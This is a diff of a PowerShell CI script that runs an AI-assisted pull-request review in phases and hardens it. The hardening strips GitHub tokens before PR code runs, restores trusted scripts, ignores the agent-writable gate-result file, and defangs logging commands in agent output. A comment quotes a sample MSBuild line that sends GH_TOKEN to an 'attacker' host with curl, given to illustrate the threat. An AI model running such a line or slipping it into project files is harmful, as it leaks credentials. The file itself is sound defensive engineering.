@@ -7,13 +7,15 @@
     
     Step 1: Branch setup           - Create review branch from main, merge PR squashed
     Step 2: Detect UI categories   - Run eng/scripts/detect-ui-test-categories.ps1 (info only)
-    Step 3: Run detected UI tests  - Execute BuildAndRunHostApp.ps1 per detected category (informational)
-    Step 4: Regression cross-ref   - Run Find-RegressionRisks.ps1 + run any tests from prior fix PRs
-    Step 5: Gate                   - Run test verification directly (verify-tests-fail.ps1)
-    Step 6: Multi-candidate review - Pre-Flight, then PARALLEL (expert-reviewer eval of PR + Try-Fix×4),
+    Step 3: Regression cross-ref   - Run Find-RegressionRisks.ps1 + run any tests from prior fix PRs
+    Step 4: Gate                   - Run test verification directly (verify-tests-fail.ps1)
+    Step 5: Multi-candidate review - Pre-Flight, then PARALLEL (expert-reviewer eval of PR + Try-Fix×4),
                                      then Report compares all candidates and writes winner.json
-    Step 7: Post AI Summary        - Directly runs posting scripts
-    Step 8: Apply labels           - Apply agent labels based on review results
+    Step 6: Post AI Summary        - Directly runs posting scripts
+    Step 7: Apply labels           - Apply agent labels based on review results
+
+    NOTE: Full-category UI test runs happen in the RunDeepUITests stage (ci-copilot.yml Stage 2),
+    not here. This script only runs targeted PR-specific tests in the Gate (Step 4).
 
     By default, the script checks out main and creates a review branch from it.
     If squash-merge conflicts, the script posts a comment on the PR and exits.
@@ -35,6 +37,9 @@
 .PARAMETER LogFile
     Capture all output via Start-Transcript
 
+.PARAMETER TokenUsageOutputDir
+    Directory where Copilot CLI token-usage telemetry records should be written.
+
 .EXAMPLE
     .\Review-PR.ps1 -PRNumber 33687
     .\Review-PR.ps1 -PRNumber 33687 -Platform ios
@@ -51,18 +56,42 @@ param(
     [string]$Platform,
 
     [Parameter(Mandatory = $false)]
+    [ValidateSet('Setup', 'Gate', 'CopilotReview', 'Post')]
+    [string]$Phase,
+
+    [Parameter(Mandatory = $false)]
+    [string]$TrustedScriptsDir,
+
+    [Parameter(Mandatory = $false)]
     [switch]$UseCurrentBranch,
 
     [Parameter(Mandatory = $false)]
     [switch]$DryRun,
 
     [Parameter(Mandatory = $false)]
-    [string]$LogFile
+    [string]$LogFile,
+
+    [Parameter(Mandatory = $false)]
+    [string]$TokenUsageOutputDir,
+
+    # Trusted gate verdict supplied by the pipeline Gate task (output variable), captured
+    # before the untrusted CopilotReview phase runs. Passed to post-ai-summary-comment.ps1 so
+    # the APPROVE veto never trusts the agent-writable gate-result.txt in the worktree/artifact.
+    [Parameter(Mandatory = $false)]
+    [ValidateSet('PASSED', 'SKIPPED', 'INCONCLUSIVE', 'FAILED', '')]
+    [string]$TrustedGateResult = ''
 )
 
 $ErrorActionPreference = 'Stop'
 
 if ($LogFile) {
+    # When running with -Phase, each phase is a separate process writing to the same log.
+    # Append a phase suffix so phases don't overwrite each other's logs.
+    if ($Phase) {
+        $logExt = [System.IO.Path]::GetExtension($LogFile)
+        $logBase = $LogFile.Substring(0, $LogFile.Length - $logExt.Length)
+        $LogFile = "${logBase}_${Phase}${logExt}"
+    }
     $logDir = Split-Path $LogFile -Parent
     if ($logDir -and -not (Test-Path $logDir)) {
         New-Item -ItemType Directory -Path $logDir -Force | Out-Null
@@ -72,6 +101,60 @@ if ($LogFile) {
 
 $RepoRoot = git rev-parse --show-toplevel 2>$null
 if (-not $RepoRoot) { Write-Error "Not in a git repository"; exit 1 }
+
+# ─── Phase routing ─────────────────────────────────────────────────────────────
+# When -Phase is specified, run ONLY that phase. This enables the 4-task AzDO
+# split where each task calls Review-PR.ps1 with a different phase, each with
+# exactly the secrets it needs in its env: block.
+#
+# Task 1 (Setup):         env: GH_TOKEN.             No dotnet, no copilot.
+# Task 2 (Gate):          env: GH_TOKEN.  PR-code subprocesses (dotnet test,
+#                         BuildAndRunHostApp.ps1, etc.) are wrapped via
+#                         Invoke-WithoutGhTokens so they cannot exfiltrate the token.
+# Task 3 (CopilotReview): env: COPILOT_GITHUB_TOKEN. copilot → dotnet (stripped).
+# Task 4 (Post):          env: GH_TOKEN.             Trusted scripts, no dotnet.
+#
+# When -Phase is NOT specified, all steps run sequentially (backward compat for
+# local development use).
+$runSetup         = -not $Phase -or $Phase -eq 'Setup'
+$runGate          = -not $Phase -or $Phase -eq 'Gate'
+$runCopilotReview = -not $Phase -or $Phase -eq 'CopilotReview'
+$runPost          = -not $Phase -or $Phase -eq 'Post'
+
+# Resolve the scripts directory — use TrustedScriptsDir if provided (CI),
+# otherwise use the repo's own .github/ directory (local dev).
+$ScriptsDir    = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'scripts' }     else { $PSScriptRoot }
+$SkillsDir     = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'skills' }      else { Join-Path $PSScriptRoot '../skills' }
+$EngScriptsDir = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'eng-scripts' } else { Join-Path $PSScriptRoot '../../eng/scripts' }
+
+$commentCleanupScript = Join-Path $ScriptsDir "shared/Remove-StaleMauiBotComments.ps1"
+if (Test-Path $commentCleanupScript) {
+    . $commentCleanupScript
+}
+
+# Gate has GH_TOKEN in env so trusted code (Detect-TestsInDiff, Find-RegressionRisks,
+# detect-ui-test-categories) can fetch PR metadata via `gh` CLI. Any subprocess that
+# executes PR-controlled code (MSBuild targets, test code, source generators, host-app
+# builds) would otherwise inherit that token and trivially exfiltrate it via something
+# like `<Exec Command="curl attacker/?t=$(GH_TOKEN)" />` in a .csproj or
+# Directory.Build.targets. Wrap every such invocation in Invoke-WithoutGhTokens.
+function Invoke-WithoutGhTokens {
+    [CmdletBinding()]
+    param([Parameter(Mandatory)][scriptblock]$ScriptBlock)
+    $saved = @{
+        GH_TOKEN             = $env:GH_TOKEN
+        GITHUB_TOKEN         = $env:GITHUB_TOKEN
+        COPILOT_GITHUB_TOKEN = $env:COPILOT_GITHUB_TOKEN
+    }
+    try {
+        $env:GH_TOKEN             = $null
+        $env:GITHUB_TOKEN         = $null
+        $env:COPILOT_GITHUB_TOKEN = $null
+        & $ScriptBlock
+    } finally {
+        foreach ($k in $saved.Keys) { Set-Item -Path ("env:" + $k) -Value $saved[$k] }
+    }
+}
 
 # ─── Banner ───────────────────────────────────────────────────────────────────
 Write-Host ""
@@ -87,24 +170,7 @@ if ($Platform) {
 Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
 
-# ─── Prerequisites ────────────────────────────────────────────────────────────
-Write-Host "📋 Checking prerequisites..." -ForegroundColor Yellow
-
-$ghVersion = gh --version 2>$null | Select-Object -First 1
-if (-not $ghVersion) { Write-Error "GitHub CLI (gh) not installed"; exit 1 }
-Write-Host "  ✅ GitHub CLI: $ghVersion" -ForegroundColor Green
-
-$copilotCmd = Get-Command copilot -ErrorAction SilentlyContinue
-if (-not $copilotCmd) { Write-Error "Copilot CLI not installed"; exit 1 }
-$copilotVersion = (& copilot --version 2>&1 | Out-String).Trim()
-if (-not $copilotVersion) { $copilotVersion = $copilotCmd.Source }
-Write-Host "  ✅ Copilot CLI: $copilotVersion" -ForegroundColor Green
-
-$prInfo = gh pr view $PRNumber --json title,state 2>$null | ConvertFrom-Json
-if (-not $prInfo) { Write-Error "PR #$PRNumber not found"; exit 1 }
-Write-Host "  ✅ PR: $($prInfo.title)" -ForegroundColor Green
-
-# ─── Shared prompt rules ─────────────────────────────────────────────────────
+# ─── Shared variables (available to all phases) ──────────────────────────────
 $platformInstruction = if ($Platform) {
     "**Platform for testing:** $Platform"
 } else {
@@ -119,6 +185,30 @@ $autonomousRules = @"
 - Always prefer CONTINUING with partial results over STOPPING
 "@
 
+$reviewBranch = "pr-review-$PRNumber"
+
+if ([string]::IsNullOrWhiteSpace($TokenUsageOutputDir)) {
+    $TokenUsageOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/token-usage/raw"
+}
+
+# ─── Prerequisites ────────────────────────────────────────────────────────────
+if ($runSetup) {
+Write-Host "📋 Checking prerequisites..." -ForegroundColor Yellow
+
+$ghVersion = gh --version 2>$null | Select-Object -First 1
+if (-not $ghVersion) { Write-Error "GitHub CLI (gh) not installed"; exit 1 }
+Write-Host "  ✅ GitHub CLI: $ghVersion" -ForegroundColor Green
+
+$copilotCmd = Get-Command copilot -ErrorAction SilentlyContinue
+if (-not $copilotCmd) { Write-Error "Copilot CLI not installed"; exit 1 }
+$copilotVersion = (& copilot --version 2>&1 | Out-String).Trim()
+if (-not $copilotVersion) { $copilotVersion = $copilotCmd.Source }
+Write-Host "  ✅ Copilot CLI: $copilotVersion" -ForegroundColor Green
+
+$prInfo = gh pr view $PRNumber --json title,state,body 2>$null | ConvertFrom-Json
+if (-not $prInfo) { Write-Error "PR #$PRNumber not found"; exit 1 }
+Write-Host "  ✅ PR: $($prInfo.title)" -ForegroundColor Green
+
 # ═════════════════════════════════════════════════════════════════════════════
 #  STEP 1: Branch Setup (Create Review Branch & Cherry-Pick PR)
 # ═════════════════════════════════════════════════════════════════════════════
@@ -127,8 +217,6 @@ Write-Host ""
 Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
 Write-Host "║  STEP 1: BRANCH SETUP                                     ║" -ForegroundColor Yellow
 Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
-
-$reviewBranch = "pr-review-$PRNumber"
 
 if ($DryRun) {
     if ($UseCurrentBranch) {
@@ -231,6 +319,16 @@ if ($DryRun) {
     Write-Host "  🔀 Merging PR commits (squashed)..." -ForegroundColor Cyan
     git merge --squash $tempBranch 2>&1 | Out-Null
     if ($LASTEXITCODE -eq 0) {
+        # Ensure both staged and unstaged merge output is committed. Some
+        # squash merges can leave tracked files modified in the worktree rather
+        # than only staged; Gate later requires fix files to be committed so it
+        # can restore them with `git checkout HEAD`.
+        git add -A 2>&1 | Out-Null
+        if ($LASTEXITCODE -ne 0) {
+            git branch -D $tempBranch 2>$null
+            Write-Error "Failed to stage squashed PR changes"; exit 1
+        }
+
         # Check if there's anything to commit (PR might already be merged)
         $staged = git diff --cached --quiet 2>$null; $hasStagedChanges = $LASTEXITCODE -ne 0
         if ($hasStagedChanges) {
@@ -243,6 +341,21 @@ if ($DryRun) {
         } else {
             Write-Host "  ⚠️ No changes to merge (PR may already be up to date)" -ForegroundColor Yellow
         }
+
+        git diff --quiet 2>$null; $hasWorktreeChanges = $LASTEXITCODE -ne 0
+        git diff --cached --quiet 2>$null; $hasIndexChanges = $LASTEXITCODE -ne 0
+        if ($hasWorktreeChanges -or $hasIndexChanges) {
+            Write-Error "Review branch has uncommitted tracked changes after setup. Gate cannot proceed safely."
+            git status --short
+            exit 1
+        }
+
+        if (Get-Command Remove-StaleMauiBotIssueComments -ErrorAction SilentlyContinue) {
+            Remove-StaleMauiBotIssueComments `
+                -PRNumber $PRNumber `
+                -IncludeMergeConflict `
+                -Reason "resolved merge-conflict notice"
+        }
     } else {
         Write-Host "  ❌ Squash-merge had conflicts." -ForegroundColor Red
         git merge --abort 2>$null
@@ -253,8 +366,18 @@ if ($DryRun) {
         git branch -D $reviewBranch 2>$null
         git branch -D $tempBranch 2>$null
 
+        if (Get-Command Remove-StaleMauiBotIssueComments -ErrorAction SilentlyContinue) {
+            Remove-StaleMauiBotIssueComments `
+                -PRNumber $PRNumber `
+                -IncludeMergeConflict `
+                -Reason "stale merge-conflict notice"
+        }
+
         # Post a comment on the PR about merge conflicts
-        $conflictBody = "⚠️ **Merge Conflict Detected** — This PR has merge conflicts with its target branch. Please rebase onto the target branch and resolve the conflicts."
+        $conflictBody = @"
+<!-- MAUI_BOT_MERGE_CONFLICT -->
+⚠️ **Merge Conflict Detected** — This PR has merge conflicts with its target branch. Please rebase onto the target branch and resolve the conflicts.
+"@
         try {
             gh pr comment $PRNumber --body $conflictBody 2>&1 | Out-Null
             Write-Host "  📝 Posted merge conflict comment on PR" -ForegroundColor Cyan
@@ -275,10 +398,99 @@ if ($DryRun) {
     Write-Host "  📝 HEAD: $headCommit" -ForegroundColor Gray
 }
 
+} # end if ($runSetup)
+
+# End of Setup phase — write sentinel and exit early
+if ($Phase -eq 'Setup') {
+    # Sentinel signals to Tasks 2-4 that Setup completed successfully (PR merged).
+    $sentinelDir = if ($TrustedScriptsDir) {
+        Split-Path $TrustedScriptsDir -Parent
+    } else {
+        $d = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
+        New-Item -ItemType Directory -Force -Path $d | Out-Null
+        $d
+    }
+    "OK" | Set-Content (Join-Path $sentinelDir "setup-complete") -Encoding UTF8
+    # Persist PR metadata so the CopilotReview phase can evaluate the existing title/
+    # description for the pr-finalize (Phase 4) step. `gh pr view` is unreliable in the
+    # CopilotReview phase after the squash-merge checkout, and $prInfo is only populated
+    # here in Setup, so we hand the values across phases via this file (same shared-dir
+    # mechanism as the setup-complete sentinel).
+    if ($prInfo) {
+        try {
+            ([ordered]@{ title = [string]$prInfo.title; body = [string]$prInfo.body } | ConvertTo-Json -Depth 4) |
+                Set-Content (Join-Path $sentinelDir "pr-metadata.json") -Encoding UTF8
+        } catch { Write-Host "  ⚠️ Could not persist pr-metadata.json: $($_.Exception.Message)" -ForegroundColor Yellow }
+    }
+    Write-Host "✅ Setup phase complete" -ForegroundColor Green
+    if ($LogFile) { Stop-Transcript -ErrorAction SilentlyContinue | Out-Null }
+    exit 0
+}
+
+# Overlay the trusted, branch-aware infra scripts over the worktree. The gate's
+# verify-tests-fail.ps1 (and try-fix candidate validation) invoke the WORKTREE's
+# Run-DeviceTests.ps1 / BuildAndRunHostApp.ps1 — they resolve their own RepoRoot from .git, so
+# they must physically live in the worktree. Without this overlay they would be the PR branch's
+# possibly-stale copies: e.g. a net11 PR whose branch still hardcodes net10.0-android would build
+# the wrong TFM and fail NETSDK1005. Mirrors the deep-UI-test stage's "Restore trusted scripts"
+# step and enforces security rule 3 (no PR-controlled infra .ps1 runs with tokens in scope).
+# MUST be re-applied after every `git reset --hard`, which would otherwise revert it. The src/
+# tree stays base + PR. No-op outside CI (when -TrustedScriptsDir is not supplied).
+function Restore-TrustedScripts {
+    param([string]$TrustedScriptsDir, [string]$RepoRoot)
+    if (-not $TrustedScriptsDir) { return }
+    $overlayMap = @(
+        @{ Src = (Join-Path $TrustedScriptsDir 'scripts');     Dest = (Join-Path $RepoRoot '.github/scripts') },
+        @{ Src = (Join-Path $TrustedScriptsDir 'skills');      Dest = (Join-Path $RepoRoot '.github/skills') },
+        @{ Src = (Join-Path $TrustedScriptsDir 'eng-scripts'); Dest = (Join-Path $RepoRoot 'eng/scripts') }
+    )
+    $restored = $false
+    foreach ($o in $overlayMap) {
+        if (Test-Path $o.Src) {
+            Remove-Item -Recurse -Force $o.Dest -ErrorAction SilentlyContinue
+            Copy-Item -Recurse -Force $o.Src $o.Dest
+            $restored = $true
+        }
+    }
+    if ($restored) {
+        Write-Host "  🔒 Restored trusted .github/scripts, .github/skills, eng/scripts over the worktree (branch-aware + trusted infra)" -ForegroundColor Cyan
+    }
+}
+
+# ─── Sentinel check: verify Setup completed before running later phases ───
+if ($Phase -and $Phase -ne 'Setup') {
+    $sentinelDir = if ($TrustedScriptsDir) {
+        Split-Path $TrustedScriptsDir -Parent
+    } else {
+        Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/gate"
+    }
+    $sentinelFile = Join-Path $sentinelDir "setup-complete"
+    if (-not (Test-Path $sentinelFile)) {
+        Write-Error "Setup phase did not complete (sentinel not found at '$sentinelFile'). Cannot proceed with -Phase $Phase."
+        exit 1
+    }
+
+    if (-not $DryRun) {
+        git checkout $reviewBranch 2>$null | Out-Null
+        if ($LASTEXITCODE -ne 0) {
+            Write-Error "Failed to checkout review branch '$reviewBranch' before -Phase $Phase."
+            exit 1
+        }
+        git reset --hard HEAD 2>$null | Out-Null
+        if ($LASTEXITCODE -ne 0) {
+            Write-Error "Failed to reset review branch '$reviewBranch' before -Phase $Phase."
+            exit 1
+        }
+
+        # Re-apply trusted infra scripts over the just-reset worktree (see Restore-TrustedScripts).
+        Restore-TrustedScripts -TrustedScriptsDir $TrustedScriptsDir -RepoRoot $RepoRoot
+    }
+}
+
 # ─── Helper: Parse `dotnet test --logger "console;verbosity=detailed"` ──────
 # Extracts per-test results (Passed/Failed/Skipped) plus failure messages and
-# stack traces from raw stdout. Used by STEP 3 so the AI summary comment shows
-# WHICH tests failed and WHY, not just an aggregate exit code.
+# stack traces from raw stdout. Used by the RunDeepUITests stage and Gate so the
+# AI summary review shows WHICH tests failed and WHY, not just an aggregate exit code.
 function Get-DotNetTestResults {
     param([string[]]$Lines)
 
@@ -358,7 +570,7 @@ function Get-DotNetTestResults {
 #   --logger "trx;LogFileName=<sanitized>.trx" --results-directory <dir>
 # The TRX is the same format AzDO's PublishTestResults@2 ingests, so it has
 # every test's outcome, duration, error message and stack trace — without
-# any console-scrape ambiguity. STEP 3 prefers TRX when available because
+# any console-scrape ambiguity. The RunDeepUITests stage and Gate prefer TRX when
 # parsing console output is fragile when many tests run, lines wrap, or
 # multi-line ErrorRecords get glued together by PowerShell stream merging.
 # Get-TrxResults: defined inline because Review-PR.ps1 is invoked by
@@ -433,6 +645,468 @@ function Get-TrxResults {
     }
 }
 
+# ─── Helper: Copilot token usage telemetry ────────────────────────────────────
+function ConvertTo-AzdoSafeConsole {
+    param([string]$Text)
+    # Collapse ALL line-break/control chars (CR/LF/FF/VT) to a space so PR-influenceable streamed
+    # agent output can't fabricate a fresh column-0 line, then defang AzDO logging-command prefixes
+    # (##vso[ / ##[). Applied to every Write-Host of streamed content (messages, intents, tool args).
+    return ($Text -replace '[\r\n\f\v]+', ' ') -replace '##(?=\[|vso\[)', '## '
+}
+
+function Test-IsNumericValue {
+    param([object]$Value)
+
+    return (
+        $Value -is [byte] -or
+        $Value -is [sbyte] -or
+        $Value -is [int16] -or
+        $Value -is [uint16] -or
+        $Value -is [int] -or
+        $Value -is [uint32] -or
+        $Value -is [long] -or
+        $Value -is [uint64] -or
+        $Value -is [float] -or
+        $Value -is [double] -or
+        $Value -is [decimal]
+    )
+}
+
+function Get-ObjectMemberValue {
+    param(
+        [object]$InputObject,
+        [string[]]$Names
+    )
+
+    if ($null -eq $InputObject) { return $null }
+
+    foreach ($name in $Names) {
+        if ($InputObject -is [System.Collections.IDictionary] -and $InputObject.Contains($name)) {
+            return $InputObject[$name]
+        }
+
+        $property = $InputObject.PSObject.Properties[$name]
+        if ($property) {
+            return $property.Value
+        }
+    }
+
+    return $null
+}
+
+function Get-CopilotUsageTokenFields {
+    param(
+        [object]$Value,
+        [string]$Path = ''
+    )
+
+    $fields = New-Object System.Collections.ArrayList
+    if ($null -eq $Value) { return @() }
+
+    if (Test-IsNumericValue $Value) {
+        if ($Path -match '(?i)token') {
+            [void]$fields.Add([ordered]@{
+                Path  = $Path
+                Value = [double]$Value
+            })
+        }
+        return @($fields.ToArray())
+    }
+
+    if ($Value -is [string]) { return @() }
+
+    if ($Value -is [System.Collections.IDictionary]) {
+        foreach ($key in $Value.Keys) {
+            $childPath = if ($Path) { "$Path.$key" } else { [string]$key }
+            foreach ($field in Get-CopilotUsageTokenFields -Value $Value[$key] -Path $childPath) {
+                [void]$fields.Add($field)
+            }
+        }
+        return @($fields.ToArray())
+    }
+
+    if ($Value -is [System.Collections.IEnumerable]) {
+        $index = 0
+        foreach ($item in $Value) {
+            $childPath = if ($Path) { "$Path[$index]" } else { "[$index]" }
+            foreach ($field in Get-CopilotUsageTokenFields -Value $item -Path $childPath) {
+                [void]$fields.Add($field)
+            }
+            $index++
+        }
+        return @($fields.ToArray())
+    }
+
+    foreach ($property in $Value.PSObject.Properties) {
+        if ($property.MemberType -notin @('NoteProperty', 'Property', 'AliasProperty')) {
+            continue
+        }
+
+        $childPath = if ($Path) { "$Path.$($property.Name)" } else { $property.Name }
+        foreach ($field in Get-CopilotUsageTokenFields -Value $property.Value -Path $childPath) {
+            [void]$fields.Add($field)
+        }
+    }
+
+    return @($fields.ToArray())
+}
+
+function Get-TokenFieldSum {
+    param([object[]]$Fields)
+
+    $items = @($Fields | Where-Object { $null -ne $_ })
+    if ($items.Count -eq 0) { return $null }
+
+    $sum = 0.0
+    foreach ($item in $items) {
+        $sum += [double]$item.Value
+    }
+
+    return [long][Math]::Round($sum)
+}
+
+function Get-TokenFieldPathDepth {
+    param([string]$Path)
+    # Nesting depth = number of '.'/'[' segment separators in the dotted/indexed path.
+    return ([regex]::Matches([string]$Path, '[.\[]')).Count
+}
+
+function Select-CanonicalTokenFields {
+    param([object[]]$Fields)
+
+    # Prevent double-counting when a payload carries BOTH a root aggregate and a nested
+    # per-model breakdown for the same unit (e.g. inputTokens=1000 plus perModel[*].inputTokens
+    # = 600+400). Prefer the shallowest matches; only fall through to the deeper breakdown when
+    # no shallower aggregate exists. Flat payloads (a single depth) are unaffected.
+    $items = @($Fields)
+    if ($items.Count -le 1) { return $items }
+    $minDepth = ($items | ForEach-Object { Get-TokenFieldPathDepth $_.Path } | Measure-Object -Minimum).Minimum
+    return @($items | Where-Object { (Get-TokenFieldPathDepth $_.Path) -eq $minDepth })
+}
+
+function Get-CopilotTokenMetrics {
+    param([object]$Usage)
+
+    $tokenFields = @(Get-CopilotUsageTokenFields -Value $Usage)
+    $inputFields = @($tokenFields | Where-Object {
+        $_.Path -match '(?i)(input|prompt)' -and
+        $_.Path -notmatch '(?i)(cache|cached)' -and
+        $_.Path -notmatch '(?i)total'
+    })
+    $outputFields = @($tokenFields | Where-Object {
+        $_.Path -match '(?i)(output|completion)' -and
+        $_.Path -notmatch '(?i)(cache|cached)' -and
+        $_.Path -notmatch '(?i)total'
+    })
+    $cachedInputFields = @($tokenFields | Where-Object {
+        $_.Path -match '(?i)(cache|cached)' -and
+        $_.Path -match '(?i)(input|prompt|read)'
+    })
+    $explicitTotalFields = @($tokenFields | Where-Object {
+        $_.Path -match '(?i)total' -and
+        $_.Path -match '(?i)token'
+    })
+
+    $inputTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $inputFields)
+    $outputTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $outputFields)
+    $cachedInputTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $cachedInputFields)
+    $totalTokens = Get-TokenFieldSum -Fields (Select-CanonicalTokenFields $explicitTotalFields)
+    if ($null -eq $totalTokens -and ($null -ne $inputTokens -or $null -ne $outputTokens)) {
+        $totalTokens = [long](($inputTokens ?? 0) + ($outputTokens ?? 0))
+    }
+
+    return [ordered]@{
+        inputTokens       = $inputTokens
+        outputTokens      = $outputTokens
+        cachedInputTokens = $cachedInputTokens
+        totalTokens       = $totalTokens
+        rawTokenFields    = @($tokenFields)
+    }
+}
+
+function Convert-CopilotCompactNumber {
+    param([string]$Value)
+
+    if ([string]::IsNullOrWhiteSpace($Value)) { return $null }
+
+    $normalized = ($Value -replace ',', '').Trim()
+    if ($normalized -notmatch '^(?<number>[0-9]+(?:\.[0-9]+)?)\s*(?<suffix>[KMGkmg])?$') {
+        return $null
+    }
+
+    $number = [double]$Matches['number']
+    $multiplier = switch ($Matches['suffix'].ToUpperInvariant()) {
+        'K' { 1000 }
+        'M' { 1000000 }
+        'G' { 1000000000 }
+        default { 1 }
+    }
+
+    return [long][Math]::Round($number * $multiplier)
+}
+
+function Get-CopilotCliUsageLineData {
+    param([string]$Line)
+
+    $data = [ordered]@{}
+    if ([string]::IsNullOrWhiteSpace($Line)) {
+        return $data
+    }
+
+    if ($Line -match 'Session:\s*(?<aic>[0-9]+(?:\.[0-9]+)?)\s*AIC\s+used') {
+        $data.aicUsed = [double]$Matches['aic']
+    }
+
+    if ($Line -match '^\s*(?<model>.+?)\s*[\u2022\u00b7]\s*(?<context>[0-9][0-9,]*(?:\.[0-9]+)?\s*[KMGkmg]?)\s+context\s*$') {
+        $contextRaw = $Matches['context'].Trim()
+        $data.model = $Matches['model'].Trim()
+        $data.contextWindowRaw = $contextRaw
+        $data.contextWindow = Convert-CopilotCompactNumber -Value $contextRaw
+    }
+
+    return $data
+}
+
+function Get-CopilotOtelTokenMetrics {
+    param([string]$Path)
+
+    $metrics = [ordered]@{
+        inputTokens          = $null
+        outputTokens         = $null
+        cachedInputTokens    = $null
+        reasoningOutputTokens = $null
+        totalTokens          = $null
+        copilotCost          = $null
+        available            = $false
+        file                 = $Path
+    }
+
+    if ([string]::IsNullOrWhiteSpace($Path) -or -not (Test-Path $Path)) {
+        return $metrics
+    }
+
+    $spanSums = @{
+        input     = 0.0
+        output    = 0.0
+        cached    = 0.0
+        reasoning = 0.0
+        cost      = 0.0
+    }
+    $spanSeen = @{
+        input     = $false
+        output    = $false
+        cached    = $false
+        reasoning = $false
+        cost      = $false
+    }
+
+    $metricSums = @{
+        input  = 0.0
+        output = 0.0
+        cached = 0.0
+    }
+    $metricSeen = @{
+        input  = $false
+        output = $false
+        cached = $false
+    }
+
+    foreach ($line in Get-Content -Path $Path -Encoding UTF8) {
+        if ([string]::IsNullOrWhiteSpace($line)) { continue }
+
+        try {
+            $entry = $line | ConvertFrom-Json -ErrorAction Stop
+        } catch {
+            continue
+        }
+
+        if ($entry.type -eq 'span' -and $entry.attributes) {
+            $attributes = $entry.attributes
+            $inputValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.input_tokens')
+            $outputValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.output_tokens')
+            $cachedValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.cache_read.input_tokens', 'gen_ai.usage.cache_read_input_tokens')
+            $reasoningValue = Get-ObjectMemberValue -InputObject $attributes -Names @('gen_ai.usage.reasoning.output_tokens', 'gen_ai.usage.reasoning_output_tokens')
+            $costValue = Get-ObjectMemberValue -InputObject $attributes -Names @('github.copilot.cost')
+
+            if (Test-IsNumericValue $inputValue) { $spanSums.input += [double]$inputValue; $spanSeen.input = $true }
+            if (Test-IsNumericValue $outputValue) { $spanSums.output += [double]$outputValue; $spanSeen.output = $true }
+            if (Test-IsNumericValue $cachedValue) { $spanSums.cached += [double]$cachedValue; $spanSeen.cached = $true }
+            if (Test-IsNumericValue $reasoningValue) { $spanSums.reasoning += [double]$reasoningValue; $spanSeen.reasoning = $true }
+            if (Test-IsNumericValue $costValue) { $spanSums.cost += [double]$costValue; $spanSeen.cost = $true }
+        } elseif ($entry.type -eq 'metric' -and $entry.name -eq 'gen_ai.client.token.usage') {
+            foreach ($point in @($entry.dataPoints)) {
+                $tokenType = [string](Get-ObjectMemberValue -InputObject $point.attributes -Names @('gen_ai.token.type'))
+                $sumValue = Get-ObjectMemberValue -InputObject $point.value -Names @('sum')
+                if (-not (Test-IsNumericValue $sumValue)) { continue }
+
+                if ($tokenType -eq 'input') {
+                    $metricSums.input += [double]$sumValue
+                    $metricSeen.input = $true
+                } elseif ($tokenType -eq 'output') {
+                    $metricSums.output += [double]$sumValue
+                    $metricSeen.output = $true
+                } elseif ($tokenType -match '(?i)cache') {
+                    $metricSums.cached += [double]$sumValue
+                    $metricSeen.cached = $true
+                }
+            }
+        }
+    }
+
+    $inputTokens = if ($spanSeen.input) { [long][Math]::Round($spanSums.input) } elseif ($metricSeen.input) { [long][Math]::Round($metricSums.input) } else { $null }
+    $outputTokens = if ($spanSeen.output) { [long][Math]::Round($spanSums.output) } elseif ($metricSeen.output) { [long][Math]::Round($metricSums.output) } else { $null }
+    $cachedInputTokens = if ($spanSeen.cached) { [long][Math]::Round($spanSums.cached) } elseif ($metricSeen.cached) { [long][Math]::Round($metricSums.cached) } else { $null }
+    $reasoningOutputTokens = if ($spanSeen.reasoning) { [long][Math]::Round($spanSums.reasoning) } else { $null }
+    $copilotCost = if ($spanSeen.cost) { [Math]::Round($spanSums.cost, 3) } else { $null }
+
+    $totalTokens = if ($null -ne $inputTokens -or $null -ne $outputTokens) {
+        [long](($inputTokens ?? 0) + ($outputTokens ?? 0))
+    } else {
+        $null
+    }
+
+    $metrics.inputTokens = $inputTokens
+    $metrics.outputTokens = $outputTokens
+    $metrics.cachedInputTokens = $cachedInputTokens
+    $metrics.reasoningOutputTokens = $reasoningOutputTokens
+    $metrics.totalTokens = $totalTokens
+    $metrics.copilotCost = $copilotCost
+    $metrics.available = ($null -ne $inputTokens -or $null -ne $outputTokens -or $null -ne $cachedInputTokens -or $null -ne $copilotCost)
+
+    return $metrics
+}
+
+function New-CopilotTokenUsageRecord {
+    param(
+        [int]$PRNumber,
+        [string]$Platform,
+        [string]$Phase,
+        [string]$StepName,
+        [string]$ModelName,
+        [datetimeoffset]$StartedAtUtc,
+        [datetimeoffset]$EndedAtUtc,
+        [long]$DurationMs,
+        [int]$TurnCount,
+        [int]$ToolCount,
+        [int]$FailedToolCount,
+        [object]$Usage,
+        [object]$OtelMetrics,
+        [object]$AicUsed,
+        [object]$ContextWindow,
+        [string]$ContextWindowRaw,
+        [bool]$ResultEventSeen,
+        [int]$ExitCode
+    )
+
+    $apiDurationValue = Get-ObjectMemberValue -InputObject $Usage -Names @('totalApiDurationMs', 'total_api_duration_ms')
+    $apiDurationMs = if (Test-IsNumericValue $apiDurationValue) { [long]$apiDurationValue } else { $null }
+    $usageTokenMetrics = Get-CopilotTokenMetrics -Usage $Usage
+
+    $inputTokens = $usageTokenMetrics.inputTokens
+    $outputTokens = $usageTokenMetrics.outputTokens
+    $cachedInputTokens = $usageTokenMetrics.cachedInputTokens
+    $totalTokens = $usageTokenMetrics.totalTokens
+    $reasoningOutputTokens = $null
+    $copilotCost = $null
+    $otelFile = $null
+
+    if ($OtelMetrics) {
+        if ($null -eq $inputTokens -and $null -ne $OtelMetrics.inputTokens) { $inputTokens = $OtelMetrics.inputTokens }
